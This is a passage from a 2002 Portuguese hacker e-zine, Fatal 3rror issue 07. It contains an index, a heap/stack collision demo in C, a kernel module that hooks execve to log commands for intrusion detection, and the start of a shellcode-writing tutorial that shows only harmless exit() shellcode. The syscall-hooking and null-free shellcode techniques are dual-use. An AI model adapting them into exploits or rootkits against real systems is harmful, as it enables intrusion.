Fatal 3rror(0007): fingers not found! Use the nose?(y/n)

       ________________________     _______________________________  
      /  __________  _______  /    /_____   _____by_Cheat_Struck__/
     /  /__ ___   / /___   / /       ___/  /___   ___   __   ___ 
    /  ___// o \ / // o \ / /       /__   // o \ / o \ /  \ / o \
   /  /   / _  // // _  // /___  _____/  // _  // _  // O // _  /
  /__/   / //_// // //_//_____/ /_______// / \_\ / \_\\__// / \_\
         )/    )/ )/                     )/    )/         )/    
         '     '  '                      '     '          ' 

                 "Depois do freeza vem o Cell neh?"
                                            Meu primo

                Fatal 3rror 07
                by Cheat Struck 
                date :    primeira semada/03/2002
                email:    cheat@struck.8m.com
                page :    http://struck.securitynetworks.com.br

                PRESTE ATENCAO!!! A PAGE MUDOU!!! QUERO UNS AMENDOINS!!!








        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~        00 - t0picZ         ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

 .od[ 00 ]bo.    t0picZ                              / Cheat Struck
 .od[ 01 ]bo.    introducing                         / Cheat Struck
 .od[ 02 ]bo.    TipZ                                / Cheat Struck
 .od[ 03 ]bo.    Novo extract.c                      / Cheat Struck
 .od[ 04 ]bo.    Colisoes entre heap e stack         / Cheat Struck
 .od[ 05 ]bo.    Remediando o Inevitavel             / pcHazard
 .od[ 06 ]bo.    Tecnicas de escrita/depuracao de shellcodes
                                                     / Cheat Struck
 .od[ 07 ]bo.    TheWatchFull (TWF)                  / Cheat Struck
 .od[ 08 ]bo.    Inetd e Tcpd                        / Cheat Struck
 .od[ 09 ]bo.    Checksums                           / mild7
 .od[ 10 ]bo.    Como roubar senhas usando uma linha de comando
                                                     / Cheat Struck
 .od[ 11 ]bo.    Insecure Programming                / Cheat Struck
 .od[ 12 ]bo.    Uma Breve Visao sobre o Futuro      / Behael
 .od[ 13 ]bo.    Truques, trickZ e faucatruaZ        / onlooker
 .od[ 14 ]bo.    SUPER L33T PROGIES                  / S}{adow
 .od[ 15 ]bo.    My mailbox                          / Cheat Struck
 .od[ 16 ]bo.    EoF                                 / Cheat Struck










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~    01 - introducing        ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~


   Ake estamos nos dinovo!
   Ao contrario do que muita gente pensa, a fatal 3rror nao acabou nem
nunca esteve perto de acabar. Nao sei porque muitas pessoas que vieram
me falar perguntavam pq tinha acabado a f3. Talvez tenha sido por eu
ter ficado 4 meses sem lancar nada, e os nossos sites tenham todos 
ficado out (com excessao do struck.8m.com).
   Mas nada acabou... e tem mais... Nesta edicao estamos comemorando 2
anos de zine. Para comemorar eu decidi finalmente publicar na page o
tao aguardado Geug. Pra quem nao sabe ainda... Geug eh um jogo que to
fazendo. Ainda ta na versao beta (por isso nao critiquem ainda) mas ja
eh jogavel.
   Alem disso, a minha homepage tambem esta sendo transferida para
http://struck.securitynetworks.com.br. Isso pq a freeservers ja ta
enchendo o sako (trancaram acesso a ftp e proibem .tgz), entao como eu
agora entrei no time da securitynetworks (veja o site do grupo em
http://team.securitynetworks.com.br) ganhei um dominio la e to me
transferindo de vez.
   Entre outras news, estou com projetos de traduzir a fatal3rror para
ingles e um pacote com os melhores programas ja publicados na f3. Alem
disso estamos nos mobilizando para por a fatal3rror.com.br o mais
rapido possivel no ar (o q vai ser dificil com o sumico do psaux) ou
buscar um novo dominio para ela.
   Isso eh tudo.
   Boa leitura!










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~          02 - TipZ         ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~



  Autores dessa edicao:
  ---------------------

Cheat Struck        <cheat@struck.8m.com>
pcHazard            <cybercrash@ig.com.br>
mild7               <>
Behael              <behael@mail.com>
onlooker            <onlooker15@yahoo.com.br>
S}{adow             <wexhenry@hobbiton.org>


  Onde baixar a Fatal 3rror???
  ----------------------------

 * Atual Distribuidor Oficiais:
http://struck.securitynetworks.com.br
http://struck.8m.com/f3

 * Outros:
http://www.txt.org
http://www.onlooker.hpg.com.br
http://4x10m4.vila.bol.com.br
ftp://ftp.netconta.com.br/pub/zines/fatal3rror/
(envie um email informando sua page)



  Extraindo a f3 e seus programas:
  --------------------------------

[root@localhost ~]# tar -zxvf f3-07.tgz
f3/
f3/f3-07.txt
f3/extract.c
[root@localhost ~]# cd f3
[root@localhost f3]# gcc extract.c -o extract
[root@localhost f3]# ./extract f3-07.txt
- Extracting 
[root@localhost f3]#










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~    03 - Novo extract.c     ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Tem um ditado q diz: "Se ta bom entao nao meche!".
   Foi por esta razao que publico o extract.c da phrack junto a f3
desde as primeiras edicoes. Mas eu tive pensando esses dias e decidi
apenas adicionar nele apenas algumas coisas que senti falta.
   Por exemplo... voce quer extrair apenas 1 arquivo especifico da f3
e nao todos da edicao. Entao voce vai na sua shell e digita:

# ./extract f3-07.txt -list
(00) file1.c
(01) file2.txt
(02) file3.pl

   E aparece a lista de arquivos que sao possiveis extrair na edicao.
   Ae voce pega o numero do arquivo (q aparece ao seu lado na lista) e
faz (digamos que queremos extrair apenas o file3.pl):

# ./extract f3-07.txt 2
- Extracting file3.pl

   Voalah! Eh soh isso, mas caso voce seja fan dos f3 programs pode
achar util essa mudanca. A partir de agora esta se torna a versao 
oficial do extract.c que vira com as f3.










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~     04 - Colisoes entre    ~YXXXXx_
  _xXXXXXX(            heap e stack        )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Nota: Este texto tambem pode ser encontrado em ingles no site
         http://team.securitynetworks.com.br/papers

-----------------------------------------------------------------------


   Nao encontrei boa documentacao sobre este bug. O maximo que consegui 
foi comentarios sobre sua existencia em alguns livros de C, porem nenhum 
texto demonstra como ocorrem colisoes entre estas duas areas de memoria 
nem quais as consequencias que podem ser causadas.
   Portanto eu tive que com o conhecimento proprio, criar programas com 
base em suposicoes para provar como este bug pode ser tao fatal qto um bug 
de buffer overflow.

   Os mais familiarizados com alocacoes dinamicas sabem que quando uma 
chamada a malloc() ou realloc() nao consegue alocar o espaco especificado 
na heap, retorna NULL. Isto normalmente ocorre quando muita memoria ja foi 
alocada na heap e a proxima chamada teria que ocupar um espaco da stack.
   Portanto colisoes da heap podem (e devem) ser controladas.
   Ja a stack nao tem como ser controlada. Um programa pode armazenar 
dados execivos na stack ateh que este caia por Segmentation fault. Para 
testar tal coisa crie um programa que chame uma funcao recursiva 
infinitamente. Algo como:

void repeat() { repeat(); }
int main() { repeat(); }

   A cada chamada a funcao repeat() sera armazenado mais dados na stack 
ateh que ela se acabe e derrube o programa.

   Como voce ja deve saber, a heap e a stack sao armazenadas de modos 
diferentes. Enquanto na stack os dados sao empilhados sobre a memoria 
alta, na heap eles sao enfileirados a partir da memoria baixa.
   Graficamente pode ser representado como:

    HEAP                                             STACK
    <memoria baixa>                         <memoria alta>
    .----------------------------------------------------.
    |                                                    |
    |------>                                      <------|
    |                                                    |
    `----------------------------------------------------'

   O code principal do programa fica em uma area da memoria baixa chamada 
de BBS, assim como dados de texto que sao marcados como somente para a
leitura. Em qualquer ocasiao em que esses dados sejam corrompidos 
(sobrescritos) o programa caira por segmentation violation.
   Mas isso nao eh o importante aqui.
   O que conseguimos ver de interessante neste grafico eh que a HEAP e a 
STACK vao uma de encontro com a outra ateh que se choquem.

   O que o programa que eu criei faz eh encher a HEAP ateh que nao seja 
mais possivel alocar memoria dinamicamente e entao escreve nos ultimos 
bytes alocados na heap uma serie de 'A's.

    HEAP                                             STACK
    <memoria baixa>                         <memoria alta>
    .----------------------------------------------------.
    |                                                    |
    |---------------------->AAAAAAAAAA            <------|
    |                                                    |
    `----------------------------------------------------'

   Em seguida chama uma funcao recursiva ateh que a STACK choque-se e 
passe pela HEAP. Quando isso ocorrer, os dados na STACK serao gravados com 
'B's. Neste momento, a HEAP e a STACK estarao ocupando a mesma area de 
memoria, portanto os dados salvos na STACK sobrescreverao os que ja 
foram salvos na HEAP.

    HEAP                                             STACK
    <memoria baixa>                         <memoria alta>
    .----------------------------------------------------.
    |                                                    |
    |---------------------->BBBBBBBBBB<------------------|
    |                                                    |
    `----------------------------------------------------'

   Com isso pode-se trabalhar sobre a mesma regiao de memoria sobre dois 
angulos diferentes, causando assim sobrescrita da dados, sobrescrita de 
enderecos de retornos, etc...
   Porem este bug somente ocorre em programas que tem que abusar de 
alocacao dinamica e recusividade.
   Ae vai o programa que ilustra a sobrescrita de dados:


<++> heapstack/hs.c
/* Programa teste que mostra como dados podem ser sobreescritos por 
   colisoes de heap com stack.

   Nota: caso ocorra Segmentation Fault, a stack foi toda utilizada e nao
   ocorreu nenhuma colisao entre ela e a heap.

*/

#define PASSO 1000000

#include <stdio.h>
#include <malloc.h>

void func(char *p, int i); 

main() { 
   char *p, *paux;
   int i;

   printf("Comecando a encher a heap...\n"); 
   p = (char *)malloc(1); 
   for(i=PASSO; (p=realloc(p,i)) != NULL; i+=PASSO)
      printf("(%015d bytes) inicio: %p \r",i,p);
   printf("\n                        fim:    %p \n",p+(i-PASSO)); 

   paux = p+(i-PASSO);
   *paux='\0';
   paux-=40;
   memset(paux,'A',39);
   printf("Ultimos dados na heap(%p): %s\n",paux,&paux[0]);

   printf("\nComecando a encher a stack...\n");
   sleep(1);
   func(p+(i-PASSO),0);

   printf("\nStack colidiu com a Heap!!!\n");
   *(paux+40)='\0';
   printf("Ultimos dados na heap(%p): %s\n",paux,&paux[0]);

   free(p);
} 

void func(char *p, int i) {
    char s[PASSO];

    //Nota: sao empilhados 32 bytes extras junto ao espaco para a variavel.
    i=i+PASSO+32; 
    printf("(%015d bytes) inicio: %p\r",i,s+i); 
    if (s < p) { 
       printf("\n                        fim:    %p \n",s-PASSO);
       memset(s,'B',(PASSO-1));
       s[PASSO-1] = '\0';
       printf("Ultimos dados na stack(%p): %s\n",s,&s[PASSO-40]);
       return; 
   }
   func(p,i); 
} 
<-->










        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~    05 - Remediando o Inevitavel     ~YXXXXx_
  _xXXXXXX(                                         )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_              pcHazard               _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~


                                         Ao som de Love in the Afternoon :)


   E bota inevitavel nisso ! NASA, DoD, Casa branca... e muitos outros
nomoes desse nosso planeta mesquino que sao "sinonimo de seguranca e
sigilo absoluto" sao invadidos todos os dias... por que seria diferente
com qualquer provedor de acesso dial-up de Joaos, Marias e etc ????

   Eh isso ai amigo, todo mundo jah foi invadido algum dia... principalmente
gente que bota regra no hosts.denny pra barrar telnet e ftp ( O_o ) de fora
e acha que jah pode deixar de levar log pra casa pra ler na cabeceira da cama
antes de durmir... "puro devaneio de wannabe :)"

   Bem, mas com algumas medidas eh possivel detectar a presenca de "usuarios
maliciosos" e impedir que seu sistema se torne playground de meninos maus :)

Como ? primeiro, pra ser um bom vigia, saiba como robar :) Imagine qualquer
situacao possivel aonde um invasor consiga acesso de root no seu sistema...
o que ele precisou fazer pra chegar ateh lah? serah que primeiro ele conseguiu
shell como usuario normal e depois com algum exploit ou qq merda pegou root
ou entrou como root direto ? o que vc admin faria assim que pegasse uma shell
seja de user normal ou root em seu sistema ?

Com certeza, em qualquer uma das hipotestes acima, pode ter certeza de uma
coisa: ele executou comandos para isso !

Bem, "isso eh mais que logico !" vc diria... mais ai eh que tah o doce dessa
tecnica de deteccao de intrusos... qualquer um que consiga uma shell, por
exemplo, num provedor aonde ninguem tem shell, daria uns "ls", ia criar
alguns diretorios pra jogar as trequera, sniffer e tal...

entao ai eh que estah o segredo ! o problema eh que logando cada comando
executado por usuarios, em poucos dias vc teria um log monstruoso, mas e dai ?
compre um HD novo e de quebra ajude o capitalismo a continuar funcionando :)

toda vez que vc executado num linux (e acredito em outros *nix tb) como
mkdir, ls etc... vc estarah executando programas como /bin/ls e /bin/mkdir
(no dos quem faz isso eh o command.com...) e eh assim com rm, rmdir e talz...

pra executar comandos, a syscall execve eh chamada e como parametros vao
o nome do executavel, a linha de comando e as variaveis de ambiente...
o que faremos eh uma simples substituicao da syscall execve para outra
escrita por nos que apenas logarah o comando executado e chamarah
a syscall antiga... e com as variaveis de ambiente passadas como parametro
podemos definir em qual diretorio o comando foi executado e assim por
diante...

o codigo fonte do logador de comandos segue no final desse artigo.

os logs ficarao no syslog da seguinte forma:

Feb  6 20:40:24 darkstar kernel: spike 0:0:311:bash cwd:/root execve:/usr/bin/id id

o campo cwd eh o diretorio aonde o comando foi executado e execve eh o comando
e os argumentos executados.

"0:0:887:bash" segue o padrao:

<UID>:<GID>:<PID>:<processo chamador>

<UID>               - UID em que o comando foi executado
<GID>               - GID em que o comando foi executado
<PID>               - PID do processo que o chamou
<processo chamador> - Nome do processo que executou o comando

assim, com essas informacoes, podemos saber nao soh qual processo executou
o comando como tambem quem era o processo pai dele, podendo assim identificar
a origem... por exemplo, caso seja usando um exploit pra abrir uma shell
qualquer, serah logado um /bin/bash executado pelo <processo chamador>
= daemon bugado :)

note que a funcao system() do C e de outras linguagens usam sh -c para
executar o parametro passado a ela, entao, pode ser que alguns comandos
executados aparecam como o "bash" sendo o <processo chamador> mesmo que
tenham sido chamados por programas, e naum por uma shell... cabe ao
admin usar seu "celebro" pra entender o que estah sendo logado :)
somente chamadas diretas a execve() sao logadas com o <processo chamador>
tendo o nome do processo (como acontece no caso de exploits por buffer
overflow, aonde execve() eh chamada na shellcode) ...

TODO:
  - pegar o parent pid e o nome do parent pid e loga-los tb :)



ativando:
20:39:33:(root):/root/projetos/spike# insmod spike.o
20:39:35:(root):/root/projetos/spike#

nos logs:
Feb  6 20:39:35 darkstar kernel: spike loaded.

vamos executar alguns comandos para testa-lo :)
19:11:31:(root):/root# id
uid=0(root) gid=0(root)
20:40:24:(root):/root# whoami
root
20:40:30:(root):/root#

ae nos logs...
Feb  6 20:40:24 darkstar kernel: spike 0:0:311:bash cwd:/root execve:/usr/bin/id id
Feb  6 20:40:30 darkstar kernel: spike 0:0:312:bash cwd:/root execve:/usr/bin/whoami whoami

bem, dai acho que jah deu pra sacar neh... :)
entaum, se vc ver um wget baixando exploit.c de uma makina as 3 da manha eh
bom ficar ligado :)

para melhorar ainda mais a seguranca, instale em sua rede o script de centralizacao
de logs, que tb se encontra nesse issue da fatal3rror ! eu sei, estou propagandas :)




<++> spike/sniff.c
/*

                                         /\
                                       /\\\\\
                                     /\\\\\\\\\
                                   /\\\\\\\\\\\\\
                                 /\\\\\\\\\\\\\\\\\
                               /\\\\\\\\\\\\\\\\\\\\\
                             /\\\\\\\\\\\\\\\\\\\\\\\\\
                           /\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
                         /\ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
                       ///\\\ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
                     /////\\\\\ \\\\\\\\\\\\\\\\\\\\\\\\\\\/
                   ///////\\\\\\\ \\\\\\\\\\\\\\\\\\\\\\\/
                 /////////\\\\\\\\\ \\\\\\\\\\\\\\\\\\\/ |
               ///////////\\\\\\\\\\\ \\\\\\\\\\\\\\\/   |
             /////////////\\\\\\\\\\\\\ \\\\\\\\\\\/     |
           ///////////+-------+\\\\\\\\\\ \\\\\\\/       |
         /////////////| SPIKE |\\\\\\\\\\\\ \\\/         |
       ///////////////+-------+\\\\\\\\\\\\\\/           |
            |                          |                 |
            |                          |     ,',        /
            |         ________         |     oOo      /
            |       /          \       |            /
            |      |  |\ __ /|  |      |          /              O
            |      |   '.  .'   |      |        /               //O
            |      |            |      |      /               //
            |      |    ,,,,    |      |    /              O//
            |      |    ''''    |      |  /                 O
            |      |____________|      |/
------------+------+-------------------+---------------------------------------

  Spike v0.1                   |
     The Loadable Guard Dog    |
  -----------------------------+

  AUTHOR
  - pcHazard <cybercrash@ig.com.br>

  fatal3rror security group
  http://fatal3rror.linuxgo.com.br

  para compilar:
  # cc -c -I/usr/src/linux/include -O2 -Wall spike.c -o spike.o
  # insmod spike.o
  
*/

#define MODULE
#define __KERNEL__
#define __KERNEL_SYSCALLS__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/netdevice.h>
#include <net/protocol.h>
#include <net/pkt_sched.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>

#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/file.h>
#include <asm/uaccess.h>

#include <asm/uaccess.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/smp_lock.h>
#include <linux/malloc.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/socket.h>
#include <stdio.h>


//Hmmm this is knew ;)
#define DBGPRN1(X)		printk(KERN_DEBUG X)
#define DBGPRN2(X,Y)		printk(KERN_DEBUG X, Y);
#define DBGPRN3(X,Y,Z)  	printk(KERN_DEBUG X, Y, Z);
#define DBGPRN4(X,Y,Z,W)	printk(KERN_DEBUG X, Y, Z, W);
#define DBGPRN5(X,Y,Z,W,V)      printk(KERN_DEBUG X, Y, Z, W, V);

#include <sys/syscall.h>

extern void* sys_call_table[];

int  (*old_execve)(struct pt_regs);

int new_execve(struct pt_regs regs)
{
    int error;
    char *filename;
    char **args, **envs;
    int i;
    
    filename = getname((char *)regs.ebx);
    args     = (char **)regs.ecx;
    envs     = (char **)regs.edx;

    printk(KERN_DEBUG "spike %d:%d:%d:%s",
                      current->uid, current->gid, current->pid, current->comm);
                      
    for (i=0;1;i++)
    {
       if (envs[i] == NULL)
          break;
       if (strncmp(envs[i], "PWD=", 4) == 0)
       {
          printk(" cwd:%s", strstr(envs[i],"=")+1 );
          break;
       }
    }

    printk(" execve:%s", filename);
                 
    for (i=0;1;i++)
    {
       if (args[i] == NULL)
          break;
       printk(" %s", args[i]);
    }
    
    printk("\n");
    error = PTR_ERR(filename);
    if(IS_ERR(filename))
	goto out;
    
    error = do_execve(filename, (char **)regs.ecx,
		      (char **)regs.edx, &regs);
    
    if(error == 0)
      current->flags &= ~PT_DTRACE;
    putname(filename);
out:
    unlock_kernel();
    return error;
}


int init_module(void)
{
   EXPORT_NO_SYMBOLS;

   DBGPRN1("spike loaded.\n");
   lock_kernel();
   old_execve = sys_call_table[SYS_execve];
   sys_call_table[SYS_execve] = new_execve;
   unlock_kernel();
   return 0;
}

void cleanup_module(void)
{
   lock_kernel();
   sys_call_table[SYS_execve] = old_execve;
   unlock_kernel();
   DBGPRN1("spike unloaded.\n");
}

<-->










        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~      06 - Tecnicas de escrita/      ~YXXXXx_
  _xXXXXXX(         depuracao de shellcodes         )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_             Cheat Struck            _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~


   Muito ja foi falado sobre shellcodes, entao porque escrever uma outra 
materia sobre este assunto tao discutido. A resposta eh muito obvia. Por 
que a maioria de textos que tratam sobre shellcodes ou sao antigos ou 
foram escritos somente usando como fonte o eterno texto do Aleph1 sobre 
buffers overflows no qual ele da uma atencao secundaria ao assunto.
   Logo chegamos a conclusao de que muita coisa foi repetida e pouca coisa 
nova foi publicada, fazendo com que verdadeiros interessados analisassem 
e "dublassem" shellcodes ja prontos para obterem mais informacoes.
   Este texto nao eh baseado em nenhum outro e foi escrito usando apenas 
conhecimento pessoal. Nao vou detalhar demais o que na minha opiniao for 
muito basico.
   Nota: O texto esta voltado a shellcodes em linux-x86 usando asm AT&T.

-------------------------------------------------------------------------
TOPICOS:
########

     .SYSTEM CALLs
     .EXEMPLO DE SYSCALL - exit() 
     .SHELLCODE do exit()
     .TRADUZINDO o SHELLCODE - exit()
     .CRIANDO FUNCOES EM SHELLCODE
     .SHELLCODE do write()
     .ADVANCED SHELLCODES



------------------------------------------------------------------------
SYSTEM CALLs
############

   Vou comecar pelo basico e ir evoluindo com o passar do texto...
   Para escrever shellcodes voce tem que simplesmente saber programar em 
Assembly. Sabendo construir um codigo eficiente em asm, transforma-lo em 
shellcode eh muito simples.
   Vou dar uma breve introducao a linguagem assembly e como interfacea-la 
em programas em C.

   Assembly eh a linguagem de mais baixo nivel que provavelmente voce ira 
programar. Isso por que programando em assembly voce estara' quase que 
programando na linguagem da maquina. Nela voce pode chamar funcoes da 
bios, do video, da impressora, etc, atraves de interrupcoes. Tambem eh 
possivel chamar funcoes do sistema operacional o que conhecemos por 
"chamadas de sistema" ou "system calls" (syscall).
   No msdos a interrupcao para syscalls eh $0x21 (se nao me engano), no 
linux e em alguns outros sistemas usamos $0x80.
   Para chamar uma syscall basta conhecer seu numero e como seus 
argumentos devem ser passados para os registradores ou para a stack (em 
alguns casos). 
   Os numeros dos syscalls sao encontrados em /usr/include/asm/unistd.h.





------------------------------------------------------------------------
EXEMPLO DE SYSCALL - exit() 
###########################

   Um exemplo simples eh a syscall exit().
   Sua sintaxe eh: void exit(int status);
   O numero da syscall deve ser armazenado no registrador AX. O numero de 
exit() eh 1. O primeiro argumento (status) normalmente eh passado para o 
registrador BX. Se houver um terceiro e quarto argumento eles seriam 
colocados em CX e DX respectivamente. 
   No caso de inteiros, o valor eh colocado (sempre em hexadecimal) nos 
registradores. Caso sejam strings eh colocado seu endereco na memoria.
   Portanto uma syscall a exit(0) pode ser feita em simples 3 linhas.

movl $0x01, %eax            // Move 1 para AX  (__exit)
movl $0x00, %ebx            // Move 0 para BX  (int status)
int $0x80                   // chama a funcao do sistema

   Voalah! Eh executado um exit(0).
   Como exit() nao retorna nada, os registradores permanecerao identicos 
depois da syscall executada. Qdo a funcao retorna algo, seu retorno eh 
jogado no registrador AX.
   Quer testar?? entao vamos colocar o code acima no primeiro programa 
teste desta materia...

<++> shellcode/asm-exit1.c

#include <stdio.h>
int main() {

  __asm__("  movl $0x01, %eax
             movl $0x00, %ebx
             int $0x80
  ");

  printf("Esta linha nao sera impressa!\n");

}
<-->

   Compile e execute. Voce notara que o programa caira antes de executar a 
ultima linha. Isso por que ele executou uma syscall a exit(0) o que 
obviamente serve para sair de um programa em status 0.





------------------------------------------------------------------------
SHELLCODE do exit()
###################

   Para construirmos o shellcode do code acima precisamos transformar as 
instrucoes feitas em uma string. Para isso usamos o gdb. Acostume-se com o 
ambiente do gdb pois iremos usa-lo muito no decorrer desta materia.


[root@struck sc]# gdb asm-exit1
[BLABLABLA...]
(gdb) disass main
Dump of assembler code for function main:
0x80483e4 <main>:       push   %ebp
0x80483e5 <main+1>:     mov    %esp,%ebp
0x80483e7 <main+3>:     sub    $0x8,%esp
0x80483ea <main+6>:     mov    $0x1,%eax
0x80483ef <main+11>:    mov    $0x0,%ebx
0x80483f4 <main+16>:    int    $0x80
0x80483f6 <main+18>:    add    $0xfffffff4,%esp
0x80483f9 <main+21>:    push   $0x8048480
0x80483fe <main+26>:    call   0x8048300 <printf>
0x8048403 <main+31>:    add    $0x10,%esp
0x8048406 <main+34>:    leave
0x8048407 <main+35>:    ret
0x8048408 <main+36>:    nop
End of assembler dump.
(gdb)


   O commando disassemble (disass) no gdb eh utilisado para (obviamente) 
disassemblar funcoes do programa (transformar em um unico codigo asm 
in-line). No caso disassemblamos o main().
  Note as linhas 

0x80483ea <main+6>:     mov    $0x1,%eax
0x80483ef <main+11>:    mov    $0x0,%ebx
0x80483f4 <main+16>:    int    $0x80
0x80483f6 <main+18>: [...]

   Aqui esta nosso code. Note que ele ocupa 12 bytes (18-6). Vamos ver 
essas linhas em forma hexadecimal byte a byte.

(gdb) x/12bx main+6
0x80483ea <main+6>:     0xb8    0x01    0x00    0x00    0x00    0xbb     
0x00   0x00
0x80483f2 <main+14>:    0x00    0x00    0xcd    0x80

   Agora transformando-as em uma string de 12 bytes:

char sc[] = 
   "\xb8\x01\x00\x00\x00"          //movl $0x01, %eax
   "\xbb\x00\x00\x00\x00"          //movl $0x00, %ebx
   "\xcd\x80";                     //int $0x80

   Porem note que esta string possui muitos caracteres \x00 o que marca o 
fim de uma string. Entao ela nao funcionara caso for passado a outro 
programa num exploit.
   O que podemos fazer eh substituir algumas instrucoes do nosso code:

movl $0x01, %eax              =     xorl %eax, %eax
                                    inc %eax

movl $0x00, %ebx              =     xorl %ebx, %ebx

   As linhas acima sao equivalentes, portanto o resultado final nao sera 
afetado, porem a forma de sua execucao sera diferente.
   Vamos testar o novo code:

<++> shellcode/asm-exit2.c
int main() {
   __asm__("   xorl %eax, %eax
               inc %eax
               xorl %ebx, %ebx
               int $0x80
   ");
}
<-->

[root@struck sc]# gcc asm-exit2.c -oasm-exit2
[root@struck sc]# gdb asm-exit2
[...]
(gdb) disass main
Dump of assembler code for function main:
0x80483b4 <main>:       push   %ebp
0x80483b5 <main+1>:     mov    %esp,%ebp
0x80483b7 <main+3>:     xor    %eax,%eax
0x80483b9 <main+5>:     inc    %eax
0x80483ba <main+6>:     xor    %ebx,%ebx
0x80483bc <main+8>:     int    $0x80
0x80483be <main+10>:    leave
0x80483bf <main+11>:    ret
End of assembler dump.
(gdb)

   Note que agora nosso code possui apenas 7 bytes (10-3).

(gdb) x/7bx main+3
0x80483b7 <main+3>:     0x31    0xc0    0x40    0x31    0xdb    0xcd    0x80
(gdb)

   E ae esta nosso shellcode. Note que nao tem nenhum 0x00 que causaria 
falha ao passar a string de um programa a outro. 
   Vamos testar o shellcode:

<++> shellcode/sc-exit.c
char sc[] =
   "\x31\xc0"         //xor %eax, %eax
   "\x40"             //inc %eax
   "\x31\xdb"         //xor %ebx, %ebx
   "\xcd\x80";        //int $0x80

int main() {
   void (*exec)() = (void *) sc;
   exec();
   printf("Esta linha nao executara!");
}
<-->

   Compile e rode. Note que a ultima linha nao executou, pois novamente o 
programa caiu ao executar o exit(0) que esta em forma de shellcode.




------------------------------------------------------------------------
TRADUZINDO o SHELLCODE - exit()
###############################

   Essa tecnica podera ser usado em qualquer shellcode que voce queira 
descobrir as instrucoes em asm que ele esta usando.
   Como foi feito no programa anteiror (sc-exit.c) criamos um ponteiro 
para funcao e o apontamos para o shellcode, entao o executamos. Usando 
novamente o gdb para disassemblar o programa vemos:

[root@struck sc]# gdb sc-exit
[...]
(gdb) disass main
Dump of assembler code for function main:
0x80483e4 <main>:       push   %ebp
0x80483e5 <main+1>:     mov    %esp,%ebp
0x80483e7 <main+3>:     sub    $0x14,%esp
0x80483ea <main+6>:     push   %ebx
0x80483eb <main+7>:     movl   $0x8049488,0xfffffffc(%ebp)
0x80483f2 <main+14>:    mov    0xfffffffc(%ebp),%ebx
0x80483f5 <main+17>:    call   *%ebx
0x80483f7 <main+19>:    add    $0xfffffff4,%esp
0x80483fa <main+22>:    push   $0x8048460
0x80483ff <main+27>:    call   0x8048300 <printf>
0x8048404 <main+32>:    add    $0x10,%esp
0x8048407 <main+35>:    mov    0xffffffe8(%ebp),%ebx
0x804840a <main+38>:    leave
0x804840b <main+39>:    ret
End of assembler dump.
(gdb)

   Note a linha:
0x80483f5 <main+17>:    call   *%ebx

   Esta linha faz a chamada ao ponteiro de funcao que aponta para o 
shellcode. Vamos fazer uma pequena depuracao no programa para saber para 
onde %ebx estara apontando na hora da chamada...

(gdb) break *main+17
Breakpoint 1 at 0x80483f5
(gdb) run
Starting program: /root/sc/sc-exit
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.

